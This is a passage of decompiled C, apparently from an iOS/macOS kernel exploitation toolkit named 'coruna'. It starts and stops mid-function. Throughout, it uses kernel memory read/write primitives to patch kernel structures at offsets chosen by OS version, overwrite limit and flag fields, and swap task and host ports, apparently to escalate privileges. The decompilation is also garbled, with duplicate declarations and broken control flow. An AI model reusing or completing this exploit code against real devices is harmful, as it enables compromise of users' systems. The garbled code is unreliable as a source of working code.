    handle = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_2();
    if (handle != 0) {
      status = *(int *)(handle + 0x140);
      if (status == 0x1809) {
        addr = 0x2b8;
      }
      else if (status == 0x1f53) {
        addr = 800;
      }
      else {
        if (status != 0x1c1b) {
          version = 0x28007;
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
          return version;
          }
          ___stack_chk_fail();
        }
        addr = 0x2a0;
      }
      addr = addr + handle;
      status = coruna_kernel6544_residual_256(handle,addr,&scratch);
      if (status == 0) {
        version = 0x2800f;
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
        return version;
        }
        ___stack_chk_fail();
      }
      status = 0;
done:
      if (scratch != 0) {
        handle = coruna_kernel6544_residual_246(handle);
        if (handle == 0) goto cleanup;
        version = size;
        if (status == 0) {
          thread_attr = 0;
          status = coruna_kernel6544_via_return_zero_2e7b0(handle,0xd,&thread_attr);
          if (status == 0) {
            version = 0x28012;
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
            return version;
            }
            ___stack_chk_fail();
          }
          if (thread_attr == 0) {
            bootargs = 0x80;
            thread_attr = coruna_mach_port_request_notification(handle,&bootargs);
            if (thread_attr == 0) {
              version = 0xad009;
              if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
              return version;
              }
              ___stack_chk_fail();
            }
            cache_57 = 0xffffffffffffffff;
            cache_24 = 0xffffffffffffffff;
            cache_59 = 0xffffffffffffffff;
            cache_58 = 0xffffffffffffffff;
            cache_54 = 0xffffffffffffffff;
            cache_23 = 0xffffffffffffffff;
            cache_56 = 0xffffffffffffffff;
            cache_55 = 0xffffffffffffffff;
            cache_51 = 0xffffffffffffffff;
            cache_22 = 0xffffffffffffffff;
            cache_53 = 0xffffffffffffffff;
            cache_52 = 0xffffffffffffffff;
            cache_48 = 0xffffffffffffffff;
            cache_21 = -1;
            cache_50 = 0xffffffffffffffff;
            cache_49 = 0xffffffffffffffff;
            status = coruna_nop_stub_7(handle,thread_attr,&cache_21,0x80);
            if ((status == 0) || (status = coruna_kernel6544_via_nop_stub_7_4(handle,0xd,thread_attr), status == 0))
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
            return version;
            }
            ___stack_chk_fail();
          }
          status = coruna_kernel6544_via_mach_vm_machine_attribute_29df8(handle,addr,thread_attr);
        }
        else {
          cache_45 = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          cache_47 = 0xffffffffffffffff;
          cache_46 = 0xffffffffffffffff;
          cache_42 = 0xffffffffffffffff;
          cache = 0xffffffffffffffff;
          cache_44 = 0xffffffffffffffff;
          cache_43 = 0xffffffffffffffff;
          cache_39 = 0xffffffffffffffff;
          work = 0xffffffffffffffff;
          cache_41 = 0xffffffffffffffff;
          cache_40 = 0xffffffffffffffff;
          cache_36 = 0xffffffffffffffff;
          frame = 0xffffffffffffffff;
          cache_38 = 0xffffffffffffffff;
          cache_37 = 0xffffffffffffffff;
          cache_33 = 0xffffffffffffffff;
          json_buf = 0xffffffffffffffff;
          cache_35 = 0xffffffffffffffff;
          cache_34 = 0xffffffffffffffff;
          cache_30 = 0xffffffffffffffff;
          url_buf = 0xffffffffffffffff;
          cache_32 = 0xffffffffffffffff;
          cache_31 = 0xffffffffffffffff;
          cache_27 = 0xffffffffffffffff;
          plist = 0xffffffffffffffff;
          cache_29 = 0xffffffffffffffff;
          cache_28 = 0xffffffffffffffff;
          cache_24 = 0xffffffffffffffff;
          region = 0xffffffffffffffff;
          cache_26 = 0xffffffffffffffff;
          cache_25 = 0xffffffffffffffff;
          cache_21 = 0xffffffffffffffff;
          tmp_buf = 0xffffffffffffffff;
          cache_23 = 0xffffffffffffffff;
          cache_22 = 0xffffffffffffffff;
          work = 0xffffffffffffffff;
          path_buf = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          cache = 0xffffffffffffffff;
          url_buf = 0xffffffffffffffff;
          sa_new = 0xffffffffffffffff;
          frame = 0xffffffffffffffff;
          json_buf = 0xffffffffffffffff;
          tmp_buf = 0xffffffffffffffff;
          sa_saved = 0xffffffffffffffff;
          plist = 0xffffffffffffffff;
          region = 0xffffffffffffffff;
          path_buf = 0xffffffffffffffff;
          stack_guard = 0xffffffffffffffff;
          stack_guard = 0xffffffffffffffff;
          block_ctx = 0xffffffffffffffff;
          sa_new = 0xffffffffffffffff;
          sa_saved = 0xffffffffffffffff;
          serial_buf = 0xffffffffffffffff;
          action = 0xffffffffffffffff;
          block_ctx = 0xffffffffffffffff;
          action = 0xffffffffffffffff;
          bootargs = 0xffffffffffffffff;
          serial_buf = 0xffffffffffffffff;
          host_info = 0xffffffffffffffff;
          thread_attr = 0xffffffffffffffff;
          scratch = 0xffffffffffffffff;
          host_info = 0xffffffffffffffff;
          status = coruna_kernel6544_via_vm_deallocate_f7f8(handle,scratch,&host_info,status);
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
        return version;
        }
        ___stack_chk_fail();
      }
      status = coruna_vm_read_write(val);
      if (status == 0) {
        version = 0x28003;
      }
      else {
        if (*(int *)k_kernel_mach_task_self_slot == (int)val) {
          coruna_ctx_set_flag(handle,0x8000000);
        }
        version = 0;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
      return version;
      }
      ___stack_chk_fail();
    }
  }
  else {
    handle = coruna_kernel6544_via_return_zero_2b000();
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      status = 0;
      if ((err == 0x2258 || err == 0x2712) || err == 0x225c) {
        status = 0x48;
      }
      u = coruna_return_zero_2b7a0(handle);
      err = coruna_kernel6544_residual_256(handle,handle + (u & 0xffffffff),&cache_21);
      version = 0x2800f;
      if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
      return version;
      }
      ___stack_chk_fail();
    }
  }
  version = 0x2800e;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return version;
  }
  ___stack_chk_fail();
}
uint * coruna_macho_data_const(uint *size,int flags)
{
  uint *ptr;
  bool err;
  uint8_t *buf;
  uint8_t u;
  uint size;
  uint version;
  pid_t lp7;
  int err;
  mach_port_t lm9;
  uint *str;
  uint64_t port;
  long handle;
  long addr;
  long off;
  long base;
  void *ptr;
  uint32_t tag;
  unsigned long kind;
  uint *copy;
  unsigned long type_id;
  uint type_id_8;
  uint type_id_9;
  unsigned long type_id_10;
  uint *data;
  unsigned long type_id_11;
  uint64_t type_id_12;
  void *buf;
  uint8_t type_id[16];
  int scratch;
  char bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  long serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  unsigned long stack_guard;
  uint sa_saved;
  uint32_t thread_attr;
  size_t sa_new;
  stat path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  block_ctx = 0;
  action = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = '\0';
  scratch = 0;
  size[0x64c] = 0xffffffff;
  size[0x64d] = 0xffffffff;
  size[0x64e] = 0xffffffff;
  size[0x64f] = 0xffffffff;
  size[0x650] = 0xffffffff;
  size[0x651] = 0xffffffff;
  _mach_timebase_info((mach_timebase_info_t)(size + 0x97));
  _pthread_mutex_init((pthread_mutex_t *)(size + 0xcc),(pthread_mutexattr_t *)0x0);
  _pthread_mutex_init((pthread_mutex_t *)(size + 0x9a),(pthread_mutexattr_t *)0x0);
  buf = k_kernel_mach_task_self_slot;
  size = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,size + 0x99,0,0);
  str = (uint *)(unsigned long)size;
  if (size != 0) {
    copy = (uint *)(unsigned long)(size | 0x80000000);
    if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return copy;
    }
    ___stack_chk_fail(str);
  }
  str = (uint *)coruna_parse_libsyscall_version(&host_info,size + 0x5b,size + 0x5c);
  if ((int)str == 0) {
    copy = (uint *)0xad015;
    if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
    return copy;
    }
    ___stack_chk_fail(str);
  }
  size = 0x28012;
  *(uint64_t *)(size + 0x52) = scratch;
  *(uint64_t *)(size + 0x50) = host_info;
  *(long *)(size + 0x56) = serial_buf;
  *(uint64_t *)(size + 0x54) = bootargs;
  *(uint64_t *)(size + 0x58) = action;
  size[0x5a] = 8;
  data = (uint *)0x28007;
  copy = data;
  if (*(long *)k_kernel_stack_chk_guard_slot == tmp_buf) {
  return copy;
  }
  ___stack_chk_fail(str);
}





bool coruna_kernel6544_via_nop_stub_7_6(long handle)
{
  int err;
  int status;
  long handle;
  uint64_t u;
  long addr;
  uint size;
  unsigned long version;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint host_info;
  long serial_buf;
  
  version = *(unsigned long *)(handle + 0x158);
  handle = coruna_kernel6544_via_return_zero_2b000();
  if (handle != 0) {
    status = 0x30;
    if (version < 0x18090a09600000) {
      status = 0x38;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        addr = 0x310;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x338;
        }
        size = 0x160;
      }
      else if (err == 0x1809) {
        size = status * 10;
        addr = 0x328;
      }
      else {
        if (err != 0x1c1b) {
          return false;
        }
        addr = 0x340;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          addr = 0x338;
        }
        size = status * 10;
      }
    }
    else {
      size = 0x160;
      addr = 0x308;
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return false;
      }
    }
    status = coruna_kernel6544_residual_256(handle,addr + handle,&serial_buf);
    if ((status != 0) && (handle = coruna_ptr_canonicalize(handle,serial_buf), handle != 0)) {
      handle = serial_buf + (unsigned long)size;
      addr = handle + 0x18;
      status = coruna_nop_stub_6(handle,addr,4,&host_info);
      if ((status != 0) && ((host_info & 1) != 0)) {
        thread_attr = 0x7fffffffffffffff;
        status = coruna_nop_stub_7(handle,handle + 0x20,&thread_attr,8);
        if (status != 0) {
          if (version < 0x18090a09600000) {
            bootargs = 0x7fffffffffffffff;
            handle = handle + 0x28;
            u = 8;
          }
          else {
            bootargs = coruna_cat(bootargs,0xffff);
            handle = handle + 0x1c;
            u = 2;
          }
          status = coruna_nop_stub_7(handle,handle,&bootargs,u);
          if (status != 0) {
            host_info = host_info & 0xffffcb0f;
            status = coruna_nop_stub_7(handle,addr,&host_info,4);
            if (status != 0) {
              scratch = 0;
              handle = 0x28;
              if (version < 0x18090a09600000) {
                handle = 0x30;
              }
              status = coruna_nop_stub_7(handle,addr + handle,&scratch,8);
              return status != 0;
            }
          }
        }
      }
    }
  }
  return false;
}





uint64_t coruna_kernel6544_via_kernel09_via_vm_allocate(uint64_t *val,uint size)
{
  int err;
  void *ptr;
  uint64_t u;
  
  ptr = _calloc(0x1d60,1);
  if (ptr == (void *)0x0) {
    u = 0xad009;
  }
  else {
    u = coruna_macho_data_const(ptr,~size & 1);
    if ((int)u == 0) {
      err = coruna_msu_statfs_probe(ptr,(long)ptr + 600);
      if (err != 0) {
        *val = ptr;
        coruna_kernel09_via_vm_allocate(ptr);
        return 0;
      }
      coruna_kernel09_via_vm_allocate(ptr);
      u = 0x28021;
    }
    _free(ptr);
  }
  return u;
}





void coruna_kernel09_via_vm_allocate(long handle)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d18 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d20 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d28 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d30 + handle) != 0) {
    coruna_vm_allocate();
  }
  if (*(long *)(&k_kernel_slot_1d38 + handle) != 0) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    coruna_vm_allocate();
    return;
  }
  return;
}





void coruna_call_plist_dict_36818(uint64_t val,uint64_t id_2)
{
  uint64_t in_stack_00000000;
  
  coruna_plist_dict_36818(val,id_2,in_stack_00000000);
  return;
}





unsigned long coruna_plist_dict_36818(long arg,unsigned long val,uint *n)

{
  uint8_t type_id_13;
  uint type_id_14;
  uint8_t *str;
  bool j;
  int err;
  int i;
  mach_port_t lm7;
  uint tag;
  kern_return_t lk9;
  unsigned long type_id_18;
  long ctx_val;
  int *flags;
  uint *entry_9;
  uint64_t type_id_16;
  uint64_t type_id;
  uint64_t type_id_20;
  long serial_19;
  uint type_id_9;
  uint type_id_10;
  uint type_id_12;
  uint type_id_22;
  uint type_id_25;
  uint type_id_26;
  long serial_20;
  uint64_t cache_41;
  uint work;
  uint cache_69;
  unsigned long type_id_11;
  
  entry_9 = (uint *)&cache_41;
  type_id_22 = 0xad008;
  type_id_11 = 0xad008;
  type_id_10 = 0xad008;
  type_id_25 = 0xad008;
  type_id_26 = 0xad008;
  tag = 0xad001;
  if (((val >> 0x1e & 3) != 0) && (n == (uint *)0x0)) {
    return 0xad001;
  }
  *(uint64_t *)(&k_kernel_slot_18c0 + arg) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + arg) = 0;
  coruna_ctx_clear_flag(arg,0x800000);
  coruna_mach_absolute_time(arg);
  str = k_kernel_mach_task_self_slot;
  type_id_18 = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_6(arg,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if ((int)type_id_18 != 0) {
    return type_id_18;
  }
  type_id_12 = (uint)val;
  type_id_14 = type_id_12 >> 8 & 0xff;
  if (type_id_14 == 3) {
    if ((0x1f52ffffffffff < *(unsigned long *)(arg + 0x158)) && (*(int *)(arg + 0x140) < 0x2258)) {
      if ((int)type_id_12 < 0x40000301) {
        if (type_id_12 == 0x80000306) {
          type_id_11 = coruna_strlcpy(arg,n,n + 4);
        }
        else if (type_id_12 == 0xc0000303) {
          type_id_11 = coruna_kernel09_via_pthread_join_2ec18_3(arg,*(uint64_t *)n,n[2],n + 3);
        }
        else if (type_id_12 == 0x302) {
          type_id_11 = coruna_kernel6544_via_pthread_join_2ec18_2(arg);
        }
      }
      else if (type_id_12 + 0xbffffcff < 6) {
        switch(type_id_12) {
        default:
          type_id_11 = coruna_newfs_hfs(arg,*n);
          break;
        }
      }
    }
    coruna_kernel09_via_vm_allocate(arg);
    return type_id_11;
  }
  type_id_9 = (uint)n;
  if (type_id_14 == 1) {
    err = 0;
    cache_41 = coruna_u64_pack((cache_41), (type_id_9));
    cache_69 = 0;
    if ((int)type_id_12 < 0x109) {
      if (-0x7ffffef4 < (int)type_id_12) {
        if (type_id_12 == 0x8000010d) {
          err = 0;
          work = work & 0xffffff00;
          if (0x44a < *(unsigned long *)(arg + 0x158) >> 0x2b) {
            err = coruna_kernel6544_via_nop_stub_6_11(arg,&work);
            type_id_22 = 0;
            if (err != 0) {
              cache_41 = coruna_u64_pack((cache_41), (work)) & 0xffffffff000000ff;
            }
          }
          goto load_ok_80;
        }
        type_id_22 = type_id_25;
        if (type_id_12 != 0xc000010b) goto load_ok_81;
        tag = *n;
        if (((tag & 1) == 0) || (*(unsigned long *)(arg + 0x158) < 0x1f530000000000)) {
          type_id_22 = 0;
        }
        else {
          type_id_22 = (uint)(*(int *)(arg + 0x140) < 0x2258);
        }
        type_id_25 = type_id_22;
        if ((tag >> 2 & 1) != 0) {
          err = coruna_ctx_test_flag(arg,0x5184001);
          if (err == 0) {
            err = coruna_ctx_test_flag(arg,0x200);
            if ((err != 0) && (type_id_25 = type_id_22 | 4, *(int *)(arg + 0x140) < 0x1809)) {
              type_id_25 = type_id_22;
            }
          }
          else {
            err = coruna_kernel6544_via_ctx_test_flag_2(arg);
            type_id_25 = type_id_22 | 4;
            if (err == 0) {
              type_id_25 = type_id_22;
            }
          }
        }
        type_id_26 = type_id_25;
        if ((tag >> 1 & 1) != 0) {
          err = coruna_ctx_test_flag(arg,0x5184001);
          if (err == 0) {
            type_id_26 = type_id_25 | 2;
          }
          else {
            err = coruna_kernel6544_via_ctx_test_flag_2(arg);
            type_id_26 = type_id_25 | 2;
            if (err == 0) {
              type_id_26 = type_id_25;
            }
          }
        }
        if (((tag >> 3 & 1) != 0) && (*(unsigned long *)(arg + 0x158) < 0x1f530000000000)) {
          type_id_26 = type_id_26 | 8;
        }
        type_id_22 = 0;
        *n = type_id_26;
load_ok_82:
        err = 1;
        goto load_ok_81;
      }
      if (type_id_12 == 0x80000108) {
        work = 0x400;
        err = coruna_msu_mnt1_path(arg,n + 4,&work,&cache_69);
        if (err == 0) {
          type_id_10 = 0;
          goto load_ok_83;
        }
        if (cache_69 != 0) {
          *n = 1;
        }
        if (work == 0) {
          type_id_22 = 0;
        }
        else {
          type_id_22 = 0;
          *n = *n | 2;
        }
        goto load_ok_82;
      }
      type_id_22 = type_id_25;
      if (type_id_12 != 0x80000109) goto load_ok_81;
      err = coruna_msu_statfs_probe(arg,&cache_41);
      type_id_22 = 0;
load_ok_80:
      if (err == 0) {
        j = true;
      }
      else {
        j = false;
        *n = (uint)cache_41;
      }
    }
    else {
      if ((int)type_id_12 < 0x10d) {
        if (type_id_12 == 0x109) {
          if (0x1f52ffffffffff < *(unsigned long *)(arg + 0x158)) {
            if ((type_id_9 & 0xf) != 1) {
              type_id_22 = 0;
            }
            goto load_ok_82;
          }
          if ((type_id_9 & 0xf) < 3) {
            err = coruna_chown_rmdir(arg);
            type_id_22 = 0;
            }
            load_ok_81:
            j = err == 0;
            }
            tag = 0x28003;
            if (!(bool)(type_id_22 == 0 & j)) {
            tag = type_id_22;
            }
            type_id_11 = (unsigned long)tag;
            coruna_kernel09_via_vm_allocate(arg);
            return type_id_11;
            }
            coruna_kernel09_via_vm_allocate(arg);
            return type_id_11;
    }
    tag = 0x28003;
    if (!(bool)(type_id_22 == 0 & j)) {
      tag = type_id_22;
    }
    type_id_11 = (unsigned long)tag;
    coruna_kernel09_via_vm_allocate(arg);
    return type_id_11;
  }
  coruna_kernel09_via_vm_allocate(arg);
  return type_id_11;
}





uint64_t coruna_surface_map(long handle)
{
  uint8_t *ptr;
  int err;
  mach_port_t lm3;
  mach_port_t lm4;
  uint64_t u;
  uint size;
  uint32_t version;
  uint scratch;
  
  *(uint64_t *)(&k_kernel_slot_18c0 + handle) = 0;
  *(uint64_t *)(&k_kernel_slot_18b8 + handle) = 0;
  coruna_ctx_clear_flag(handle,0x800000);
  coruna_mach_absolute_time(handle);
  ptr = k_kernel_mach_task_self_slot;
  u = coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_6(handle,*(uint32_t *)k_kernel_mach_task_self_slot,0,0);
  if ((int)u != 0) {
    return u;
  }
  u = 0x2801f;
  err = coruna_ctx_test_flag(handle,0x400);
  if (err != 0) {
    scratch = 0;
    err = coruna_msu_statfs_probe(handle,&scratch);
    if (err == 0) {
      return 0x28020;
    }
    if (scratch != 3) {
      size = *(uint *)(handle + 600);
      if (1 < size) {
        if (size != 3) {
          return 0x28020;
        }
        size = 0;
      }
      if ((scratch != size) && (err = coruna_chown_rmdir(handle), err == 0)) {
        return 0x28020;
      }
    }
  }
  err = coruna_ctx_test_flag(handle,4);
  if (((err == 0) || (err = coruna_kernel6544_via_ctx_test_flag_4(handle,0), err != 0)) &&
     ((*(long *)(&k_kernel_slot_1900 + handle) == 0 ||
      (err = coruna_task_info_2e7d8(handle,*(uint32_t *)ptr,2,&k_kernel_slot_1908 + handle,8), err != 0))
     )) {
    lm4 = *(mach_port_t *)(&k_kernel_slot_192c + handle);
    if ((1 < lm4 + 1) && (lm3 = _mach_thread_self(), lm4 == lm3)) {
      lm4 = _mach_thread_self();
      version = 0x4000000;
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        version = 1;
      }
      err = coruna_return_zero_37b2c(handle,lm4,version,0);
      if (err == 0) {
        return 0x2801f;
      }
    }
    if (((*(int *)(&k_kernel_slot_1910 + handle) == 0 && *(int *)(&k_kernel_slot_1914 + handle) == 0) ||
        (err = coruna_getuid(handle,*(int *)(&k_kernel_slot_1910 + handle),
                              *(int *)(&k_kernel_slot_1914 + handle),0), err != 0)) &&
       ((lm4 = _mach_host_self(), lm4 == *(mach_port_t *)(&k_kernel_slot_1928 + handle) ||
        ((err = coruna_ctx_test_flag(handle,0x10), err != 0 ||
         (err = coruna_set_task_token(handle,*(uint32_t *)ptr,
                               *(uint32_t *)(&k_kernel_slot_1928 + handle)), err != 0)))))) {
      coruna_kernel09_via_vm_allocate(handle);
      u = 0;
    }
  }
  return u;
}





uint64_t coruna_pthread_mutex_destroy(void *ctx)
{
  pthread_mutex_t *ptr;
  uint8_t *ptr;
  int err;
  uint64_t *buf;
  uint64_t *str;
  uint32_t scratch;
  
  coruna_kernel6544_via_ctx_test_flag();
  coruna_kernel09_via_mach_port_allocate(ctx);
  if (*(void (**)((long)ctx + 0x1d0) != (void (*)0x0) {
    (**(void (**)((long)ctx + 0x1d0))(ctx);
  }
  ptr = k_kernel_mach_task_self_slot;
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1918) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,
               *(mach_port_name_t *)((long)ctx + 0x1918));
  }
  if ((((*(int *)((long)ctx + 0x1938) != -1) || (*(int *)((long)ctx + 0x193c) != -1)) ||
      (*(int *)((long)ctx + 0x1930) != -1)) ||
     ((*(int *)((long)ctx + 0x1934) != -1 || (*(int *)((long)ctx + 0x1940) != -1)))) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      if (*(int *)((long)ctx + 0x1938) != -1) {
        _close(*(int *)((long)ctx + 0x1938));
        *(uint32_t *)((long)ctx + 0x1938) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x193c) != -1) {
        _close(*(int *)((long)ctx + 0x193c));
        *(uint32_t *)((long)ctx + 0x193c) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1940) != -1) {
        _close(*(int *)((long)ctx + 0x1940));
        *(uint32_t *)((long)ctx + 0x1940) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1930) != -1) {
        _close(*(int *)((long)ctx + 0x1930));
        *(uint32_t *)((long)ctx + 0x1930) = 0xffffffff;
      }
      if (*(int *)((long)ctx + 0x1934) != -1) {
        _close(*(int *)((long)ctx + 0x1934));
        *(uint32_t *)((long)ctx + 0x1934) = 0xffffffff;
      }
      coruna_close(scratch);
    }
  }
  if (*(long *)((long)ctx + 0x28) != 0) {
    coruna_semaphore_destroy(ctx,1);
  }
  if (*(long *)((long)ctx + 0x1d48) != 0) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_vm_deallocate_1d60c(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0x5c) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_mach_port_deallocate_1d418(ctx);
      coruna_close(scratch);
    }
  }
  if (1 < *(int *)((long)ctx + 0xac) + 1U) {
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err == 0) {
      coruna_pthread_from_mach_thread_np_1d4a4(ctx);
      coruna_close(scratch);
    }
  }
  coruna_kernel600c_via_open_dev_null(ctx);
  _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1920));
  if (1 < *(mach_port_name_t *)((long)ctx + 0x1924) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0x1924));
  }
  if (1 < *(int *)((long)ctx + 0x10) + 1U) {
    _IOObjectRelease();
  }
  if (1 < *(int *)((long)ctx + 0x18d8) + 1U) {
    *(uint32_t *)((long)ctx + 0x18d8) = 0;
  }
  if ((*(vm_address_t *)((long)ctx + 0x118) != 0) &&
     (*(vm_size_t *)((long)ctx + 0x120) != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)((long)ctx + 0x118),
                   *(vm_size_t *)((long)ctx + 0x120));
  }
  if (1 < *(semaphore_t *)((long)ctx + 0x264) + 1) {
    _semaphore_destroy(*(task_t *)ptr,*(semaphore_t *)((long)ctx + 0x264));
    *(uint32_t *)((long)ctx + 0x264) = 0;
  }
  ptr = (pthread_mutex_t *)((long)ctx + 0x330);
  err = _pthread_mutex_lock(ptr);
  if (err == 0) {
    buf = *(uint64_t **)((long)ctx + 0x370);
    *(uint64_t *)((long)ctx + 0x370) = 0;
    while (buf != (uint64_t *)0x0) {
      if (1 < *(mach_port_name_t *)((long)buf + 0x1c) + 1) {
        _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)buf + 0x1c),1,-1);
      }
      str = (uint64_t *)*buf;
      buf[4] = 0;
      buf[1] = 0;
      *buf = 0;
      buf[3] = 0;
      buf[2] = 0;
      _free(buf);
      buf = str;
    }
    _pthread_mutex_unlock(ptr);
  }
  _pthread_mutex_destroy(ptr);
  _pthread_mutex_destroy((pthread_mutex_t *)((long)ctx + 0x268));
  if (*(long *)((long)ctx + 0x1d18) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d18));
    *(uint64_t *)((long)ctx + 0x1d18) = 0;
  }
  if (*(long *)((long)ctx + 0x1d20) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d20));
    *(uint64_t *)((long)ctx + 0x1d20) = 0;
  }
  if (*(long *)((long)ctx + 0x1d28) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d28));
    *(uint64_t *)((long)ctx + 0x1d28) = 0;
  }
  if (*(long *)((long)ctx + 0x1d30) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d30));
    *(uint64_t *)((long)ctx + 0x1d30) = 0;
  }
  if (*(long *)((long)ctx + 0x1d38) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1d38));
    *(uint64_t *)((long)ctx + 0x1d38) = 0;
  }
  if (*(long *)((long)ctx + 0x1a00) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x1a00));
    *(uint64_t *)((long)ctx + 0x1a00) = 0;
  }
  if (*(long *)((long)ctx + 0x19f8) != 0) {
    coruna_kernel09_via_vm_deallocate_120b8();
    _free(*(void **)((long)ctx + 0x19f8));
    *(uint64_t *)((long)ctx + 0x19f8) = 0;
  }
  if (*(void **)((long)ctx + 0x1d10) != (void *)0x0) {
    _free(*(void **)((long)ctx + 0x1d10));
    *(uint64_t *)((long)ctx + 0x1d10) = 0;
    *(uint32_t *)((long)ctx + 0x1d08) = 0;
  }
  if (1 < *(mach_port_name_t *)((long)ctx + 0xe8) + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)((long)ctx + 0xe8));
    *(uint32_t *)((long)ctx + 0xe8) = 0;
  }
  _bzero(ctx,0x1d60);
  _free(ctx);
  return 0;
}





uint64_t coruna_return_zero_37b2c(long handle,uint64_t val,uint size,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_return_zero_2ccdc();
  }
  else {
    handle = coruna_return_zero_2ca60();
    if (handle == 0) {
      return 0;
    }
    handle = handle + 0x28;
  }
  if (handle != 0) {
    u = coruna_kernel6544_via_fcntl_1bf84(handle,handle,&scratch);
    if ((int)u == 0) {
      return u;
    }
    size = 0xfffffffe;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      size = 0xf0000000;
    }
    if ((size & scratch) == 0) {
      size = scratch | size;
      if (flags == 0) {
        size = scratch & (size ^ 0xffffffff);
      }
      if ((size != scratch) && (u = coruna_kernel6544_via_mach_vm_machine_attribute(handle,handle), (int)u == 0)) {
        return u;
      }
      return 1;
    }
  }
  return 0;
}





uint64_t coruna_kernel6544_via_nop_stub_6_11(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  byte scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  u = coruna_find_text_exec_37df0(val,&thread_attr,&bootargs);
  if ((int)u != 0) {
    coruna_ctx_test_flag(val,0x5184001);
    err = coruna_nop_stub_6(val,thread_attr,1,&scratch);
    if ((err == 0) || (1 < scratch)) {
      u = 0;
    }
    else {
      *(bool *)id_2 = scratch != 0;
      u = 1;
    }
  }
  return u;
}





uint64_t coruna_return_zero_37c98(uint64_t val,uint size)
{
  byte err;
  uint64_t u;
  int err;
  uint64_t size;
  byte scratch;
  byte bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  
  thread_attr = 0;
  host_info = 0;
  size = coruna_find_text_exec_37df0(val,&thread_attr,&host_info);
  if ((int)size == 0) {
    return size;
  }
  err = coruna_ctx_test_flag(val,0x5184001);
  u = host_info;
  size = thread_attr;
  err = (byte)size;
  if (err == 0) {
    err = coruna_nop_stub_6(val,thread_attr,1,&bootargs);
    if (err == 0) {
      return 0;
    }
    if (1 < bootargs) {
      return 0;
    }
    if (bootargs == size) {
      return 1;
    }
    bootargs = err;
    err = coruna_nop_stub_7(val,size,&bootargs,1);
  }
  else {
